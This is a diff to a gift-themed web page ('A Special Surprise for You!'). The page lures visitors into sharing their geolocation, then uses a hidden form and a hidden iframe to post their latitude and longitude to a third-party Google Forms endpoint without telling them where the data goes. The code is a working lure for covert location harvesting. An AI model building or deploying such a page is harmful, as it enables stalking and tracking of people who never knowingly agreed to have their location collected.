@@ -13,6 +13,7 @@
             height: 100vh;
             margin: 0;
             background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            flex-direction: column;
         }
         .container {
             text-align: center;
@@ -21,6 +22,7 @@
             border-radius: 12px;
             box-shadow: 0 4px 10px rgba(0,0,0,0.2);
             max-width: 400px;
+            margin-bottom: 20px;
         }
         h1 {
             color: #d32f2f;
@@ -45,61 +47,62 @@
             color: #388e3c;
             font-weight: bold;
         }
+        .status {
+            margin-top: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            display: none;
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
         <h1>A Special Surprise for You!</h1>
-        <button onclick="requestLocation()">Click for Your Gift</button>
+        <button onclick="showGift()">Click for Your Gift</button>
         <div class="gift" id="giftMessage">🎁 You just got a special present! Thank you! 🎁</div>
     </div>
+
     <div class="container">
-        <h1>Thank you gift</h1>
+        <h1>Thank You Gift</h1>
         <button onclick="requestLocation()">Click Here to Share Location</button>
-        <div class="status hidden" id="statusMessage"></div>
+        <div class="status" id="statusMessage"></div>
     </div>
 
+    <!-- Hidden Form for Google Forms Submission -->
+    <form id="googleForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdd-5vv11ZJ3nV87vVhB1Zj9jHkrFXMBy1z38xc2QX-QLyz3w/formResponse" method="POST" target="hidden_iframe">
+        <input type="hidden" name="entry.1234567890" id="latInput">
+        <input type="hidden" name="entry.0987654321" id="lonInput">
+    </form>
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+
     <script>
-        function updateStatus(message, type = 'info') {
-            const statusElement = document.getElementById('statusMessage');
-            statusElement.className = `status ${type}`;
-            statusElement.textContent = message;
-            statusElement.classList.remove('hidden');
+        function showGift() {
+            document.getElementById('giftMessage').style.display = 'block';
         }
 
-       async function saveToGoogleForms(lat, lon) {
-    const formId = '1FAIpQLSdd-5vv11ZJ3nV87vVhB1Zj9jHkrFXMBy1z38xc2QX-QLyz3w'; // Replace with actual Google Form ID
-    const entryLat = "1234567890"; // Replace with actual entry ID for latitude
-    const entryLon = "0987654321"; // Replace with actual entry ID for longitude
+        function updateStatus(message, type = 'info') {
+            const statusElement = document.getElementById('statusMessage');
+            statusElement.textContent = message;
+            statusElement.style.display = 'block';
+            statusElement.style.color = type === 'success' ? 'green' : 'red';
+        }
 
-    const formUrl = `https://docs.google.com/forms/d/e/${formId}/formResponse`;
-    const formData = new FormData();
-    formData.append(`entry.${entryLat}`, lat);
-    formData.append(`entry.${entryLon}`, lon);
+        function saveToGoogleForms(lat, lon) {
+            document.getElementById('latInput').value = lat;
+            document.getElementById('lonInput').value = lon;
+            document.getElementById('googleForm').submit();
 
-    try {
-        const response = await fetch(formUrl, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        });
+            updateStatus('Location saved successfully!', 'success');
 
-        updateStatus('Location saved to cloud!', 'success');
-
-        // Create downloadable file
-        const data = `Latitude: ${lat}, Longitude: ${lon}\n`;
-        const blob = new Blob([data], { type: 'text/plain' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = 'location.txt';
-        link.click();
-
-    } catch (error) {
-        console.error('Error saving location:', error);
-        updateStatus('Failed to save location.', 'error');
-    }
-}
-
+            // Create downloadable file
+            const data = `Latitude: ${lat}, Longitude: ${lon}\n`;
+            const blob = new Blob([data], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'location.txt';
+            link.click();
+        }
 
         function requestLocation() {
             updateStatus('Requesting location...');
@@ -122,5 +125,6 @@
             );
         }
     </script>
+
 </body>
 </html>
